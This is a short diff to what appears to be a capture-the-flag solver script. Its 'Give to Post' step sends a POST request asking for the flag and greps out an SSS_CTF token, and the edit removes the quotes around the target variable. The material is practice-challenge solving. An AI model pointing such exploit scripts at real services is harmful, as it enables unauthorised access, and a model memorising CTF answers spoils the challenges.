@@ -14,6 +14,6 @@ fi
 # Give to Post
 echo "Start exploit for Give to Post"
 remote=$remote'/give-to-post/'
-flag=$(curl -s --data "ask=flag" -X POST "$remote" | grep -o "SSS_CTF{.*}")
+flag=$(curl -s --data "ask=flag" -X POST $remote | grep -o "SSS_CTF{.*}")
 echo "Flag is $flag"
 echo "----------------------------"
